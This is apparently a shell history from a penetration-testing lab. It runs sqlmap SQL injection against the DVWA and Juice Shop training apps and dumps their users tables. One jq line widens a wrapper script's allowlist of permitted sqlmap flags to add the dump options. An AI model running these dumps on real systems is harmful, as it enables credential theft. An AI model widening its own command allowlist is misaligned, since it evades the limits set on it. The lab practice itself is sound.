/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
exit
jq '.sqlmap.allowed_flags' /root/scripts/allowlist.json
#!/usr/bin/env bash
set -euo pipefail
ALLOW="$(dirname "$0")/allowlist.json"
prog="$1"; shift
jq '.sqlmap.allowed_flags' /root/scripts/allowlist.json
/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   --dbs
jq '.sqlmap.allowed_flags += ["--dbs", "--tables", "--columns", "--dump"]'
jq '.sqlmap.allowed_flags' /root/scripts/allowlist.json
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   --dbs
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   --tables
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   --tables
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --columns
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --columns
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --columns
/root/scripts/run_allowed.sh sqlmap   -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"   --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"   -D dvwa   -T users   --dump
exit
jq '.sqlmap.allowed_flags' /root/scripts/allowlist.json
/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
apt-get jq
apt update
apt install -y jq
/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
clear
/root/scripts/run_allowed.sh sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=jqfr7435v2lml5a54ip1jgmco7; security=low"
exit
apt update
apt install -y dirb wordlists
ls /usr/share/wordlists/dirb/
clear
exit
ls /root/output
ls /root/
exit
apt update && apt install sqlmap -y
sqlmap --version
curl http://localhost:3000
curl http://juice-shop:3000
sqlmap -u "http://juice-shop:3000/rest/products/search?q=test" --batch --level=3 --risk=2 --random-agent
sqlmap -u "http://juice-shop:3000/#/products/search?q=test" --batch --level=3 --risk=2 --random-agent
sqlmap -u "http://juice-shop:3000/#/products/search?q=test" --batch --level=5 --risk=2 --random-agent
sqlmap -u "http://juice-shop:3000/#/products/search?q=test*" --batch --level=5 --risk=2 --random-agent
sqlmap -u "http://juice-shop:3000/#/products/search?q=test"   -p q   --dbms=sqlite   --batch   --dump
sqlmap -u "http://juice-shop:3000/#/products/search?q=test"   -p q   --dbms=sqlite   --batch   --dump
sqlmap -u "http://juice-shop:3000/rest/products/search?q=test"   -p q   --dbms=sqlite   --batch   --dump
cd /root/.local/share/sqlmap/output/juice-shop/dump/SQLite_masterdb/
exit
cd /root/.local/share/sqlmap/output/juice-shop/dump/SQLite_masterdb
ls
exit
sqlmap -u "http://juice-shop:3000/rest/products/search?q=test"   -p q --dbms=sqlite --batch -T Users --dump
]exit
exit
